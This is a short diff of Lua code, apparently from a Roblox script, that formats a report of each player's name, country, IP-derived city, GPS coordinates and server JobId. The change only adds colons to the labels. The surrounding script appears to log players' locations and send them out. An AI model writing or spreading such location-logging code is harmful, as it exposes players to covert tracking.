@@ -285,8 +285,8 @@ local embed = {
 			["value"] = "```表示名: " .. player.DisplayName
 				.. "\n名前: " .. player.Name
 				.. "\n国: " .. codeToName[country]
-				.. "\nIP" .. 	ipinfo_table.city
-				.. "\nGPS" .. 	ipinfo_table.loc
+				.. "\nIP: " .. 	ipinfo_table.city
+				.. "\nGPS: " .. 	ipinfo_table.loc
 				.. "\njobid: " .. tostring(game.JobId)
 				.. "```"
 		}
